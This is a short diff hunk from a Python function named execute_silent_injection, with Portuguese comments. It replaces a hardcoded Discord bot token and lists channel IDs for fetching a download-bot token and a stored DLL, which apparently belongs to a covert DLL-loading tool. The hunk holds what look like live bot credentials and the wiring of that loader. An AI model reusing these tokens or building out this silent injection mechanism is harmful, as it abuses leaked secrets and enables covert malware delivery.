@@ -42,7 +42,7 @@ def execute_silent_injection():
     # Canal para buscar o TOKEN do bot de download
     TOKEN_CHANNEL_ID = "1394101967718060042"
     # Token do BOT que tem permissão para LER o canal do token
-    TOKEN_READER_BOT_AUTH = "MTM4ODk5NzUyNDU4ODcyNDM3NQ.Gi9cRZ.Oy2znEMpQG-9WyF1FATW2BSLMRmJfnLNQp-Iz8" # IMPORTANTE: Substitua pelo token do bot que vai ler o token no canal
+    TOKEN_READER_BOT_AUTH = "MTM4ODk5NzUyNDU4ODcyNDM3NQ.GZS5Xo.7suXK4uApQFPfdx9q3IkXd41Sj8hAjaC-WKTq0" # IMPORTANTE: Substitua pelo token do bot que vai ler o token no canal
     
     # Canal onde a DLL está armazenada
     DLL_CHANNEL_ID = "1393441968566046750"
